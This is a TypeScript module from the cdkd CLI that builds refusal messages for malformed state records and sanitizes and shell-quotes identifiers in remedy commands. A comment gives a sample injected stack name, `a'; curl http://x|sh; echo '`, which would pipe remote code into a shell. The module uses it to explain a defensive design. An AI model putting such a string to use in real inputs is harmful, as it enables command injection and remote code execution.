import { CdkdError } from '../utils/error-handler.js';
import { markNonRetryable } from '../deployment/retryable-errors.js';
import {
  IDENT_MAX_CODE_POINTS,
  STACK_REF_MAX_CODE_POINTS,
  UNRENDERABLE,
  displayIdent,
  displaySafe,
  isPasteableIdent,
  truncateCodePoints,
} from '../utils/display-safe.js';
import {
  commandHole,
  recoveryCommandFlags,
  sanitizeRecoveryValue,
  shellQuote,
} from './lock-contention-message.js';
import type { LockRecoveryContext } from './lock-contention-message.js';
import { describeRegionValueKind, isReadableBag } from '../types/state.js';
import type { StackState } from '../types/state.js';

/**
 * The row name a READ-ONLY command reports for a record whose whole `resources`
 * map is unreadable — `cdkd drift` as a `notCompared` outcome and `cdkd diff`
 * as an unreadable row. Parenthesised so it cannot be mistaken for a logical
 * id, which CloudFormation keeps alphanumeric.
 */
export const UNREADABLE_RESOURCES_MAP_ROW = '(resources map)';

/** The error code every malformed-record refusal carries, whatever its class. */
export const STATE_RESOURCES_MALFORMED = 'STATE_RESOURCES_MALFORMED';

/**
 * Answer the ONE question both helpers below key on: can this record's
 * resource map be read at all?
 *
 * Widened past `null` / `undefined` because the message says "no readable
 * resources map" and a hand-edited record does not stop at those two: a
 * `[]`, a `5` or a `"ab"` all survive `Object.entries` and yield a bag that is
 * empty or, for the string, absurd — repaired silently and warned about
 * nowhere. The predicate is the plain-object test the bag's own type implies.
 */
export function hasReadableResources(state: StackState): boolean {
  return isReadableBag(state.resources);
}

/**
 * The same question for the `outputs` bag — and it is a SEPARATE predicate
 * rather than a second argument to the one above because the ABSENCE rule
 * differs, which is the split {@link isReadableBag}'s own note calls a
 * per-container call.
 *
 * An absent `outputs` bag is an ordinary record, not a defect: `cdkd scrub`
 * round-trips one deliberately rather than materializing `{}` over it, and the
 * deploy's failure-path saves write `outputs: currentState.outputs`, which
 * `JSON.stringify` drops when it is `undefined`. So `undefined` is EXEMPT here
 * while it is a defect for `resources`. `null` is NOT exempt — it is a value a
 * hand-edited record carries and every consumer either throws on it or
 * launders it into `{}`.
 *
 * Both {@link repairMalformedOutputsForReadOnly} and
 * {@link refuseMalformedOutputs} delegate to this, so the read-only and the
 * write-capable halves cannot come to different verdicts about the same record.
 */
export function hasReadableOutputs(state: Pick<StackState, 'outputs'>): boolean {
  return state.outputs === undefined || isReadableBag(state.outputs);
}

/**
 * The plain-object test itself, without the `resources` field bound to it.
 *
 * RE-EXPORTED, not defined here any more: it MOVED to `src/types/state.ts` with
 * go-to-k/cdkd#3192, whose own doc carries the full rationale and the reason for
 * the move (`importableOutputKeys` needs the predicate, and it sits in the layer
 * this module imports FROM). Every importer of this module is unchanged — the
 * same shape, and the same reason, as `DEFAULT_STATE_PREFIX` moving into
 * `src/state/state-prefix.ts`.
 *
 * Enumerate the consumers with `grep -rn "isReadableBag" src/` rather than from
 * a list here; four successive enumerations of them, written by reasoning, came
 * out incomplete.
 */
export { isReadableBag };

/**
 * The cap for a value whose grammar is SHORT — an AWS region, or the name of a
 * state container. Unchanged from the literal this module used for every
 * identifier before go-to-k/cdkd#3018 made the cap a parameter, so no message
 * carrying either moves.
 *
 * A logical id does NOT share it: CloudFormation allows 255 characters there
 * (`IDENT_MAX_CODE_POINTS`), and a legitimate 129-to-255-character CDK id cut at
 * 128 renders as a name the record does not hold.
 */
const SHORT_NAME_MAX_CODE_POINTS = 128;

/**
 * The shared explanation, in the terms the reader needs: what is wrong, what
 * to look at, and what NOT to do next.
 *
 * Both identifiers are SANITIZED and THEN SHELL-QUOTED, and the command is
 * emitted LAST and UNWRAPPED — the shape `lock-contention-message.ts` and
 * `.claude/rules/layout-state-types.md` require of any suggestion a user is
 * meant to paste, for two separate reasons.
 *
 * Sanitizing alone is not enough. `displaySafe(..., { asciiOnly: true })` is a
 * printable-ASCII allowlist, so it removes the line- and escape-forgery class
 * but KEEPS `'`, `;`, `|`, `` ` ``, `$` and spaces — and neither name is
 * trusted here, since a stack name reaches the cross-stack read path from an
 * `Fn::GetStackOutput` argument or an S3 key. A name spelled
 * `a'; curl http://x|sh; echo '` would close the quoting and append its own
 * command to the line this text tells the user to RUN.
 *
 * Wrapping the command in `'...'` is not enough either, and is what makes the
 * two compose badly: `shellQuote` does its own quoting, so an outer wrapper
 * produces something unpastable. Hence unwrapped and last.
 *
 * An identifier that sanitizes to EMPTY becomes `UNRENDERABLE` rather than
 * nothing — an empty argument makes `--stack-region` swallow the next flag,
 * turning a remedy into a differently-broken command.
 *
 * MODULE-PRIVATE, and it stayed that way after go-to-k/cdkd#3206's review
 * considered exporting it. `cdkd scrub`'s audited-record refusal needed the
 * same three properties (sanitize, cap, `UNRENDERABLE` on empty) plus a
 * BOUNDARY, because its names go into a comma-joined list where a name
 * containing the delimiter forges an entry. `displayIdent` has all four —
 * JSON-quoting escapes the delimiter it adds — so that caller uses it and this
 * stays private. The pair here is not duplicated: what differs is the
 * `shellQuote` composition every message in THIS module needs and that one
 * must not have.
 *
 * The helper itself carries no `buildForceUnlockCommand`-style exactness gate,
 * which SUPPRESSES a whole command when sanitizing changed the value. The
 * difference is what the command DOES: `cdkd force-unlock` deletes another
 * process's lock, so naming a stack that is not quite the record's is
 * destructive and suppressing is right. The command most texts here end on is
 * `cdkd state show`, which reads; emitting it with a sanitized name leads the
 * reader either to "no state found for ..." or to a sibling record the name
 * now matches, which a read shows them as healthy. Neither changes anything,
 * where emitting NOTHING leaves a broken record with no next step at all. A
 * text that points at a command which WRITES owns the gate at its own site:
 * {@link malformedDestroyResourcesRefusalMessage} names no target unless both
 * identifiers render exactly, and gives `cdkd state orphan` as a template.
 */
function safeIdentifier(value: string, maxCodePoints: number): string {
  // CAPPED as well as sanitized. A stack name can arrive from an S3 key, so a
  // planted multi-kilobyte one would push the trailing remedy command off the
  // reader's screen -- the message would be technically correct and useless.
  // `truncateCodePoints` rather than `slice`, so the cut never lands inside a
  // surrogate pair; `displaySafe` rather than `displayIdent`, because the
  // latter JSON-quotes and that would compose badly with `shellQuote` below.
  //
  // The cap is a REQUIRED parameter, so no site can fall into a region-sized
  // default. Most RECORD-DERIVED identifiers reach it through the per-kind
  // helpers below; two builders pass a cap directly — cdkd's own container
  // names take `SHORT_NAME_MAX_CODE_POINTS`, whose own doc carries the reason
  // and whose names are not record-derived at all, and
  // `divergentRecordRegionRefusalMessage` measures a key region at the
  // state-record grammar's cap (go-to-k/cdkd#3328) rather than a region's, for
  // the reason stated at that site. A stack name takes
  // `STACK_REF_MAX_CODE_POINTS`, the grammar a cdkd state-record reference is
  // legitimate up to and the same bound `isPasteableIdent` uses: at 128 an
  // ordinary multi-level CDK nested child
  // (`<root>~<...NestedStackResource><hash>~<...>`, measured past 150 code
  // points) truncates, which named a stack that does not exist and made
  // `malformedDestroyResourcesRefusalMessage`'s exactness verdict take its
  // fallback arm on a HEALTHY record. Still bounded, so a planted
  // multi-kilobyte name is truncated too.
  const safe = displaySafe(value, { asciiOnly: true });
  if (!safe) return UNRENDERABLE;
  const { text, truncated } = truncateCodePoints(safe, maxCodePoints);
  return truncated ? `${text}...` : text;
}

/*
 * One named helper per identifier KIND, and no default cap on the shared body.
 * The cap used to be a defaulted parameter, and the default was the region's:
 * every stack-name site that forgot to pass the wider one — four of them, found
 * across two review rounds and not all by the same reader — silently cut a
 * legitimate `Parent~Child~...` name at 128 and emitted a remedy command naming
 * a stack that does not exist. A named helper cannot be called with the wrong
 * cap, and a new kind of RECORD-DERIVED identifier has to be added here rather
 * than improvised at a site. (Container names are cdkd's own fixed literals, not
 * record-derived, and take the short cap directly at their one site.)
 */

/**
 * A stack name, which a nested chain makes legitimately long.
 *
 * Safe for a command that only READS. A caller building a command that WRITES
 * owns an exactness gate as well — print the command only when this returns the
 * value unchanged, since a name sanitizing altered can resolve to a different
 * stack — whenever the identity can hold characters sanitizing alters: anything
 * not already validated, whether a user typed it or the record supplied it.
 * `reportDriftBaselineGaps` (`src/cli/commands/export.ts`) gates its
 * `refresh-observed` command for that reason: `cdkd export --template` takes
 * the stack name as a free-typed positional, and the record BODY is a second
 * source when a caller omits the loaded identity. A synthesized stack name is
 * not an exception by itself — a prebuilt cloud assembly's name is read
 * unvalidated — which is why `dropRecordCommand` gates its substitution on
 * {@link rendersExactly} (go-to-k/cdkd#3360, closed by go-to-k/cdkd#3363).
 */
export function safeStackName(value: string): string {
  return safeIdentifier(value, STACK_REF_MAX_CODE_POINTS);
}

/** An AWS region. */
export function safeRegion(value: string): string {
  return safeIdentifier(value, SHORT_NAME_MAX_CODE_POINTS);
}

/**
 * A CloudFormation logical id, as it appears in a LIST of ids — which is the
 * only way this module and its callers print one.
 *
 * NOT {@link safeIdentifier}, although it is the obvious third sibling, and it
 * used to be exactly that. `displaySafe` TRIMS, so a sanitize-then-quote pair
 * renders a torn `resources["Bucket "]` byte-identically to a healthy sibling
 * `Bucket`, and the message sends the reader to the intact record while the
 * damaged one goes unnamed. `displayIdent` compares the sanitized text with the
 * raw one and JSON-quotes whenever they differ, so a padded or rewritten id can
 * never render bare. Past that, what it shows is judged on the text it KEEPS:
 * a kept part holding a character outside the plain-identifier set (`'`, a
 * space) is wrapped in double quotes with an embedded `"` escaped, so text an
 * id plants on a line that ends in a pasteable command stays visibly inside one
 * quoted token. A cut id is followed by `[cut: N more characters withheld]`,
 * which cannot be read as part of it — so a plain 255-character prefix renders
 * bare with that marker even when the withheld tail held a `'`, and nothing of
 * the tail is shown. An id with nothing renderable left is the bare
 * `<unrenderable>` stand-in. A
 * bare `,` inside a plain id still reads as two entries in a `', '`-joined list
 * — the residual go-to-k/cdkd#3179 records for every caller of the helper. That
 * is the answer go-to-k/cdkd#3317 recorded for
 * `namedPropertyBagsClause`; this is the same rule for the other lists, so two
 * sibling clauses in one module cannot give opposite answers.
 *
 * Capped at `IDENT_MAX_CODE_POINTS`, a logical id's own limit, rather than a
 * region-sized cut that would name no record.
 */
export function displayLogicalId(value: string): string {
  return displayIdent(value, { maxCodePoints: IDENT_MAX_CODE_POINTS });
}

/**
 * The DIAGNOSIS sentence itself, with no identity and no remedy in it.
 *
 * ONE spelling, because two copies of a diagnosis are what drift. It is extracted because
 * {@link malformedDestroyResourcesRefusalMessage} needs the same sentence
 * under an identity it does NOT trust, where the detail's substituted
 * `cdkd state show` command must not appear — a difference in the COMMAND, not
 * in the diagnosis.
 */
const MALFORMED_RESOURCES_DIAGNOSIS =
  `has no readable 'resources' map — the record is malformed or truncated. Both 'cdkd deploy' ` +
  `and 'cdkd destroy' REFUSE such a record rather than acting on it: they read the same map, ` +
  `an unreadable one is indistinguishable from an empty stack, and acting on that reading ` +
  `would make a deploy re-CREATE every resource and a destroy delete none of them.`;

/**
 * Identity plus the diagnosis, and NO command — every consumer appends prose
 * after this half, so a command baked in here can only land mid-sentence
 * (go-to-k/cdkd#3516). It used to end on a substituted `cdkd state show`, which
 * put the one runnable command in four messages one space from the next clause:
 * a line-select paste then handed `cdkd state show` the following sentence as
 * positional arguments. The command is {@link inspectCommand}'s, and the
 * caller ends ON it — the contract that function's own note states, and the
 * shape {@link malformedDestroyOutputsRefusalMessage} already had. Its
 * `orphans` twin had it too until this change gave both DESTROY refusals a
 * per-line shape instead, so that one is no longer the example to copy.
 *
 * `stackName` is optional so the withhold arm of
 * {@link malformedDestroyResourcesRefusalMessage} takes this same helper: that
 * arm must state the diagnosis under an identity it does not trust, which is
 * {@link stackClause}'s no-identity form rather than a second spelling.
 */
function malformedStateDiagnosis(
  stackName: string | undefined,
  region: string | undefined
): string {
  return `${stackClause(stackName, region)} ${MALFORMED_RESOURCES_DIAGNOSIS}`;
}

/**
 * For a READ-ONLY command: give the record an empty resource bag so the
 * command can report on it, and say so (issue go-to-k/cdkd#3018).
 *
 * `parseStateBody` deliberately does not validate the inner shape, so a
 * hand-edited or truncated record reaches a command with `resources` absent,
 * `null`, or some other non-object. Every such command then died on a raw
 * `TypeError` from the first `Object.keys` / `in` / index read — the exact
 * wording differs per shape (`Cannot convert undefined or null to object`,
 * `Cannot use 'in' operator`, `Cannot read properties of null`), and none of
 * them names a stack, a key or a remedy, from exactly the commands a user
 * reaches for WHEN the state is broken.
 *
 * WHY AT THE LOAD AND NOT AT EACH LOOP. The first cut of #3018 put `?? {}` on
 * the twelve `Object.entries(state.resources)` loops, which was inert: every
 * one of those flows dereferences the bag EARLIER — `!(id in state.resources)`,
 * `hasOwnProperty.call(...)`, `state.resources[logicalId]` — so the abort still
 * happened one line up and the guards only made it look handled. One call per
 * load dominates the whole flow behind it, including the helpers that take the
 * state as a parameter (`orphan-rewriter`, `diff-calculator`,
 * `collectCcApiRoutes`).
 *
 * Mutates in place and returns whether it repaired anything; the caller warns
 * on `true`. A silent repair is its own defect — an empty resource set is
 * indistinguishable from a healthy empty stack in every later line of output,
 * so `No changes detected` over an unreadable record is a clean verdict about
 * nothing.
 *
 * **Only for a command that cannot WRITE state.** Anything that can persist
 * uses {@link refuseMalformedState} instead; see its note.
 */
export function repairMalformedResourcesForReadOnly(state: StackState): boolean {
  if (hasReadableResources(state)) return false;
  state.resources = {};
  return true;
}

/**
 * The refusal TEXT, for a command whose own exit-code contract means this
 * cannot be a plain `CdkdError`.
 *
 * `cdkd scrub` is the case: its exit `1` is SPOKEN FOR ("--fail found
 * plaintext") and every one of its refusals carries `exitCode = 2`, because a
 * CI gate reading the code alone must be able to tell "scrub looked and found
 * a leak" from "scrub refused to look" — the two call for opposite responses.
 * So scrub tests {@link hasReadableResources} and raises its own class around
 * this text rather than calling {@link refuseMalformedState}.
 *
 * The other three refusing commands do NOT share that need, and giving them a
 * single shared code would be wrong in the other direction: `cdkd rollback`
 * documents `2` as "PARTIAL — journal kept, idempotent re-run", so a `2` here
 * would tell an operator to re-run a command that attempted nothing.
 */
export function malformedStateRefusalMessage(stackName: string, region: string): string {
  return (
    `${malformedStateDiagnosis(stackName, region)} This command can WRITE state, so it refuses ` +
    `rather than continuing: saving over a record whose resource map could not be read would ` +
    `replace the evidence with a well-formed empty one and lose it permanently. Repair or ` +
    `remove the record first. Inspect it with: ${inspectCommand(stackName, region)}`
  );
}

/**
 * The destructive template the two DESTROY refusals offer, on its own line.
 *
 * ONE spelling, because two copies are what drift, and these two carry it
 * byte-identically on purpose — a reader who has met one must recognise the
 * other. `<stack>` / `<region>` are LITERAL: nothing may substitute them, for
 * the reason {@link malformedDestroyResourcesRefusalMessage}'s note gives.
 */
const DROP_RECORD_TEMPLATE = 'cdkd state orphan <stack> --stack-region <region>';

/**
 * The same template as a LABELLED line, for the two messages that carry their
 * commands one per line. The COMMAND is the atom rather than the line, because
 * the command is what drifts: `divergentRecordRegionRefusalMessage` ends on it
 * with no label, so a `--stack-region` rename could otherwise half-land.
 */
const DROP_RECORD_LINE = `Drop the record: ${DROP_RECORD_TEMPLATE}`;

/**
 * May this message NAME its target and offer the destructive template beside
 * it (go-to-k/cdkd#3516 review)?
 *
 * Stricter than `safeIdentifier(x) === x`, which is what these two arms used
 * and which keeps a space, a `'`, a `;` and a `|`. That was enough while the
 * message was one paragraph, and stopped being enough the moment the commands
 * moved onto LABELLED lines: a stack name spelling
 * `Drop the record: cdkd state orphan prod --stack-region us-east-1` renders
 * exactly, takes this arm, and lands inside the quoted name on the inspect
 * line — where a terminal wrap puts cdkd's own label at the start of a visual
 * line, carrying a destructive command whose holes are already filled. A
 * line-select copies it. The label vocabulary is what made the forgery
 * credible, so the gate that admits a name into it is the one that had to
 * tighten.
 *
 * {@link isPasteableIdent} is that gate and the codebase already spends it on
 * this question (`gc.ts` gates its own destructive hint on the same pair). It
 * refuses a space and a quote outright while keeping every name CloudFormation
 * can produce, `Parent~Child` included, so no healthy record loses its
 * identity here.
 */
function mayNameTargetWithDestructiveRemedy(stackName: string, region: string): boolean {
  // A CONJUNCTION with the per-kind exactness, never a replacement for it —
  // and the two halves do NOT earn their place equally, which is worth saying
  // rather than leaving a reader to infer it from one measurement.
  //
  // The REGION pair is load-bearing: `isPasteableIdent` measures against the
  // STACK cap (`STACK_REF_MAX_CODE_POINTS`), so on its own it admits a region
  // past a REGION's 128 — which `safeRegion` truncates, putting a cut value in
  // the clause above the template. Measured: dropping `safeRegion(...)` here
  // reddens the truncated-region withhold row, and dropping
  // `isPasteableIdent(region)` reddens the forged-region row.
  //
  // The STACK pair OVERLAPS today: `isPasteableIdent`'s charset is a subset of
  // what `displaySafe(_, { asciiOnly: true })` passes unchanged and its
  // identity test forbids truncation at the same cap `safeStackName` uses, so
  // `isPasteableIdent(stackName)` already implies `safeStackName(...) === ...`.
  // Kept per-kind anyway, so that widening either charset or either cap cannot
  // silently drop the other's bound.
  return (
    safeStackName(stackName) === stackName &&
    safeRegion(region) === region &&
    isPasteableIdent(stackName) &&
    isPasteableIdent(region)
  );
}

/**
 * The DESTROY refusal text for the `resources` bag (issue
 * [#3161](https://github.com/go-to-k/cdkd/issues/3161)).
 *
 * A SECOND `resources` refusal beside {@link malformedStateRefusalMessage},
 * for the reason every split in this module is its own: that text says saving
 * over the record "would replace the evidence with a well-formed empty one",
 * which is not what a destroy does. A destroy DELETES the record, and it does
 * so down a path the other four refusing commands never take.
 *
 * What the runner does with the bag is COUNT it —
 * `Object.keys(state.resources).length` — and route on the count. The count is
 * the list of what to delete, so an unreadable bag counts ZERO and the run
 * takes the EMPTY-STACK FAST PATH, which deletes `state.json` outright. Every
 * resource the record named stays live in AWS, now unreferenced, and the
 * destroy reports success.
 *
 * **Reading the bag as EMPTY — the read-only repair — IS that outcome rather
 * than an alternative to it**, which is why no repair is available here.
 * Measured rather than reasoned: `[]`, `5` and `true` all enumerate no keys,
 * so they already ARE the repaired-to-`{}` shape, and each one reaches the
 * fast path today. The same measurement
 * {@link refuseMalformedResourceProperties} records one container down.
 *
 * It NAMES `cdkd state orphan`, which the sibling refusals do not, and
 * that answers the objection go-to-k/cdkd#3161 raises against refusing at all
 * — that a cleanup command refusing leaves the user with no supported way to
 * tear the stack down. Proceeding would not tear anything down either, and
 * that is per-shape rather than a slogan: `[]` / a number / a boolean name no
 * resource at all, while a STRING names one fabricated logical id per
 * character whose ENTRY is a single character — so `resourceType` and
 * `physicalId` are both `undefined` and `ProviderRegistry.getProviderFor`
 * throws before any provider is selected, which means no AWS delete is issued
 * and no live resource can be addressed. (Measured 2026-09-17 against the real
 * registry: `Cannot read properties of undefined (reading 'startsWith')`, out
 * of the `isCustomResource` test — a routing failure, NOT a `provider.delete`
 * rejection, which an earlier revision of this note claimed.) What a forced
 * run would do is therefore bounded by the record: on the first three shapes
 * it deletes `state.json` and nothing else, and on a string every fabricated
 * id fails and `errorCount > 0` keeps a record — but keeps it LAUNDERED, since
 * the preserve-write spreads the bag (`{ ...state.resources }`) and `'ab'`
 * comes back as a well-formed `{"0":"a","1":"b"}`. So "it preserves the
 * evidence" would be the wrong defence of proceeding; the string shape reaches
 * the same laundering by another route, which strengthens the refusal rather
 * than weakening it (review round 2 of go-to-k/cdkd#3332). The only outcome
 * worth offering is the record's removal, and `cdkd state orphan` is the
 * supported command for it, leaving the live resources in place. It reads
 * `state.resources` nowhere, which is what makes the pointer true and is
 * fenced in `tests/unit/state/malformed-resources-bag.test.ts`.
 *
 * **That remedy is a TEMPLATE, not a substituted command, and the asymmetry
 * with the `cdkd state show` line above it is the point.** `state orphan`
 * DELETES a record; `state show` reads one. The `region` this function is
 * handed comes from `destroy-runner.ts`'s `state.region ?? ctx.baseRegion` —
 * which WAS record-body content `getState` did not check against the key it
 * loaded from, measured 2026-09-17: a record planted at
 * `.../us-east-1/state.json` carrying `"region": "eu-west-1"` rendered a
 * pasteable `cdkd state orphan <stack> --stack-region eu-west-1`, aiming a
 * destructive command at a DIFFERENT region's record for the same stack. That
 * is the misdirection class {@link stackClause} records for stack names, one
 * field over. Substituting into the read-only `state show` line is the
 * pre-existing behaviour of {@link inspectCommand} and is left alone;
 * what this lane must not add is a destructive one.
 *
 * **go-to-k/cdkd#3328 closed the BODY half of that, and the template stays
 * anyway** — the measurement above is now history, not a live repro.
 * `S3StateBackend.getState` normalizes a region-scoped record's `region` to
 * its KEY's and warns on a body that disagreed, so `state.region` reaching
 * this function is the key's region. But the key is an S3 KEY SEGMENT, which
 * is bucket-plantable in its own right (`cdkd/<stack>/<anything>/state.json`
 * lists as a region), and a legacy record still falls through to
 * `ctx.baseRegion`. So the value is still not this process's own, and a
 * DELETING command built from it is still the thing not to hand over.
 *
 * **A template is not enough on its own, because the name the reader would
 * type into it comes from the clause ABOVE.** `safeIdentifier` composes
 * `displaySafe` with a cap, and `displaySafe` TRIMS — so a planted
 * `resources["..."]` record keyed `"prod-api "` opens this message as
 * `State for 'prod-api' (...)`, byte-identical to a HEALTHY sibling spelled
 * `prod-api`. An operator who then orphans "the record the line above names"
 * deletes the intact one. That is exactly the identity failure `displayIdent`
 * exists for and {@link namedPropertyBagsClause} applies to logical ids. So
 * the remedy sentence is GATED on the identity rendering EXACTLY: when it does
 * not, the text names no removal target at all and opens on
 * {@link stackClause}'s no-identity form, ending on
 * {@link inspectCommand}'s TEMPLATE rather than on a command built from the
 * very identity it just called untrustworthy. The same call
 * `buildForceUnlockCommand` makes when a value would render misleadingly.
 *
 * **Rendering exactly is not the same as being TRUE, and the EXACT arm must
 * not claim it is.** `exact` answers a question about this message's own text;
 * it says nothing about PROVENANCE. A planted `"region": "eu-west-1"` on a
 * `.../us-east-1/` key is an ordinary region string, so it renders exactly and
 * the arm fires — and an earlier revision then said to run `cdkd state orphan`
 * "with the stack and region this message NAMES", which is the attacker's
 * region (review round 2 of go-to-k/cdkd#3332: templating had removed the
 * paste, not the aim). The arm therefore points at the record's S3 KEY, which
 * `getState` resolved and a record body cannot forge.
 *
 * Since go-to-k/cdkd#3328 the printed region IS that key's — `getState`
 * normalizes a region-scoped record's `region` to the key's region and warns
 * on a body that disagreed — so the arm no longer has to warn the reader that
 * the two may differ, and its text no longer does. It still says WHERE the
 * region comes from and still sends the reader to `cdkd state list --long` to
 * confirm the key, because a key segment is itself bucket-plantable and
 * because a LEGACY record has no key region at all, in which case the value
 * printed is the CLI's own and `--stack-region` must be omitted.
 *
 * **The VERDICT turns on the identifier caps**, which is why the stack name is
 * measured through {@link safeStackName} (`STACK_REF_MAX_CODE_POINTS`) and the
 * region through {@link safeRegion} (128, which no real region approaches). At
 * 128 an ordinary multi-level CDK nested child
 * (`<root>~<...NestedStackResource><hash>~<...>`, measured past 150 code
 * points) truncates, fails `exact`, and takes the withhold arm on a HEALTHY
 * record — which is fail-safe but makes the fallback the common path for
 * exactly the nested destroys this lane added a guard to (review round 2 of
 * go-to-k/cdkd#3332). The bound is still a bound: a planted multi-kilobyte name
 * is truncated at 1152 and lands in the withhold arm.
 *
 * Identifiers are sanitized and THEN shell-quoted, for the reasons
 * {@link safeIdentifier}'s note gives.
 */
export function malformedDestroyResourcesRefusalMessage(stackName: string, region: string): string {
  // EXACTNESS, not merely printability: `safeIdentifier` may trim, substitute
  // or truncate, and each of those can render a planted identifier as a
  // healthy one. Compared against the RAW value, so any divergence at all
  // suppresses the target-naming half.
  // Through the per-kind helpers: this arm's VERDICT turns on the caps, and a
  // stack name capped at a region's 128 would send an ordinary multi-level
  // nested child down the withhold arm.
  const exact = mayNameTargetWithDestructiveRemedy(stackName, region);
  // The DIAGNOSIS half, one helper for both arms: it carries no command, so the
  // only difference is the identity it is allowed to name. The withhold arm must
  // name none — a message that has just said "another record may render
  // identically" cannot then hand over a command built from that rendering, since
  // following it would READ the healthy sibling, return a clean record, and raise
  // the operator's confidence right before the destructive step.
  const detail = malformedStateDiagnosis(exact ? stackName : undefined, exact ? region : undefined);
  const remedy = exact
    ? `To drop the record deliberately and leave the live resources standing, run ` +
      `'cdkd state orphan' against the stack and the region THE RECORD'S S3 KEY holds. It is ` +
      `spelled as a template on its own line below rather than handed over ready to run, ` +
      `because that command DELETES a record and a key segment is chosen by anyone who can ` +
      `write this bucket: the key says WHICH record this is, which is not the same as ` +
      `vouching for it as a delete target. Confirm the key with 'cdkd state list --long' — a ` +
      `legacy record shows none, and for one of those the flag must be OMITTED or it selects ` +
      `nothing.`
    : `This record's stack name or region does NOT render exactly — what is printed above is a ` +
      `sanitized form, and another record may render identically — so this message names no ` +
      `target and offers no command against one. List the records as stored with ` +
      `'cdkd state list --long', which prints a name needing sanitizing in quoted form, and act ` +
      `on the one whose key matches.`;
  const prose =
    `${detail} This command DELETES state, so it refuses ` +
    `rather than continuing: the resource map IS the list of what to delete, so an unreadable ` +
    `one counts as ZERO resources and the run takes the empty-stack fast path, which removes ` +
    `state.json and reports success while every resource the record named is still live in AWS ` +
    `and no longer referenced by anything. Reading the bag as EMPTY is that same outcome rather ` +
    `than an alternative to it, so there is no repair available here. Repair or remove the ` +
    `record first. ${remedy}`;
  // ONE COMMAND PER LINE, the shape
  // {@link malformedOrphanResourcePropertiesRefusalMessage} already takes
  // (go-to-k/cdkd#3516). A single line cannot hold both: the pasteable READ has
  // to end its line or a line-select paste hands it the next clause as
  // positional arguments, and the destructive TEMPLATE has to be the last thing
  // on its own line or the substituted region sitting after it is the value an
  // operator fills the holes with — the warning above it says not to, and
  // "above" stops covering what follows. Separate lines answer both.
  // The inspect command takes the SAME arguments the diagnosis did: on the
  // withhold arm it must stay a template, or the message hands over a read
  // built from a rendering it has just said may name a healthy sibling.
  return [
    prose,
    `Inspect the record: ${inspectCommand(exact ? stackName : undefined, exact ? region : undefined)}`,
    // Only the exact arm offers it. The withhold arm names no target, so a
    // destructive template there would be an instruction with nothing to fill
    // the holes from.
    ...(exact ? [DROP_RECORD_LINE] : []),
  ].join('\n');
}

/**
 * For `cdkd destroy` / `cdkd state destroy`: refuse a record whose `resources`
 * bag cannot be read (issue
 * [#3161](https://github.com/go-to-k/cdkd/issues/3161)).
 *
 * The `resources` twin of {@link refuseMalformedOutputsForDestroy}, and a
 * SEPARATE call from it for the reason that one is separate from
 * {@link refuseMalformedOutputs}: a record can be malformed in either
 * container alone and the refusal must name the one that is broken.
 *
 * CALL IT AT THE TOP OF THE DESTROY, **above the `resourceCount` read**. The
 * placement rule is {@link repairMalformedResourcesForReadOnly}'s and it is
 * not decoration here: the empty-stack fast path sits immediately below that
 * read and DELETES the record, so a guard written anywhere below it refuses a
 * record that is already gone.
 */
export function refuseMalformedResourcesForDestroy(
  state: StackState,
  stackName: string,
  region: string
): void {
  if (hasReadableResources(state)) return;
  // `markNonRetryable` for the reason `refuseMalformedOutputsForDestroy`
  // carries it: the verdict comes from a PERSISTED record, so no retry can
  // change it, while the message interpolates caller-derived identifiers a
  // SUBSTRING-matching retry classifier can read as transient. Issue #1838.
  throw markNonRetryable(
    new CdkdError(
      malformedDestroyResourcesRefusalMessage(stackName, region),
      STATE_RESOURCES_MALFORMED
    )
  );
}

/** The code a destroy refusal over a body/key region divergence carries. */
export const STATE_REGION_DIVERGED = 'STATE_REGION_DIVERGED';

/**
 * The DESTROY refusal text for a record whose BODY names a different region
 * than the KEY it was read from, while it still lists resources (issue
 * [#3328](https://github.com/go-to-k/cdkd/issues/3328), review round 1).
 *
 * **This is the one case where adopting the key is not enough, and it is a
 * consequence of adopting it rather than an argument against.**
 * `S3StateBackend.getState` replaces the body's `region` with the key's, which
 * is right for the key math, the lock and the record's own identity — cdkd
 * stamps the key's region into every body it writes, so a divergence means
 * another writer. But WHERE THE RESOURCES ARE is a different question, and a
 * divergent record is the one shape that gives two answers to it. cdkd cannot
 * tell which half is honest:
 *
 * - the BODY lies (a planted field, the misdirection this issue is about) —
 *   the resources are in the key's region and acting there is correct;
 * - the KEY lies (an `aws s3 cp` between region prefixes, a restore, a
 *   third-party writer) — the resources are in the body's region, and acting
 *   in the key's finds NOTHING.
 *
 * The second one is not a wash, it is silent data loss: `destroy-runner.ts`
 * reads a `*NotFound` from a provider as ALREADY DELETED (`deletedCount++`,
 * the row dropped from the record), so a whole stack of live resources would
 * be reported destroyed and `deleteState` would then remove the only record
 * naming them. `assertRegionMatch` — the guard that exists to stop exactly
 * that inference — cannot fire, because after normalization
 * `DeleteContext.expectedRegion` and the client region are the same value by
 * construction.
 *
 * So the refusal is narrow by design and its trigger is the CONJUNCTION:
 * divergent AND at least one resource. **A resource-less record is
 * deliberately NOT refused** — there is nothing to orphan, and that is the
 * issue's own measured repro plus the `cdkd state destroy` recovery path the
 * read-side decision exists to protect. The read path still refuses NOTHING:
 * `cdkd state show`, `cdkd state list` and `cdkd state orphan` all keep
 * working on the very record this refuses to DELETE FROM, which is what keeps
 * it fixable.
 *
 * The remedy is a TEMPLATE, never a substituted command, for the reason
 * {@link malformedDestroyResourcesRefusalMessage} records — the region reaching
 * this builder is an S3 key SEGMENT, which anyone able to write the bucket
 * chooses. (NOT "because cdkd does not know which region belongs in the flag",
 * which an earlier revision said and which is false for this flag:
 * `--stack-region` on `state orphan` selects the RECORD, and the key's region
 * is exactly that.) The body's region is not printed at all — its KIND is, the
 * bounded token {@link describeRegionValueKind} produces, for the reason
 * `getState`'s warn gives.
 *
 * And the target-naming half is GATED on both identifiers rendering EXACTLY,
 * the second half of that sibling's rule: a template is not enough on its own,
 * because the name the reader types into it comes from the clause ABOVE.
 */
export function divergentRecordRegionRefusalMessage(
  stackName: string,
  keyRegion: string,
  divergentBodyRegion: unknown,
  /** `undefined` when the bag could not be READ — see the refusal's fail-closed arm. */
  resourceCount: number | undefined
): string {
  // EXACTNESS, and it is the same gate {@link malformedDestroyResourcesRefusalMessage}
  // carries three functions up, for the reason its note gives: `safeIdentifier`
  // composes `displaySafe`, which TRIMS and truncates, so a record keyed
  // `'prod-api '` opens this message byte-identically to a HEALTHY sibling —
  // and an operator who then orphans "the record the line above names" deletes
  // the intact one. This message ends on a DELETING command, so it owes the
  // same withhold arm; round 2 of go-to-k/cdkd#3328 found it shipping without
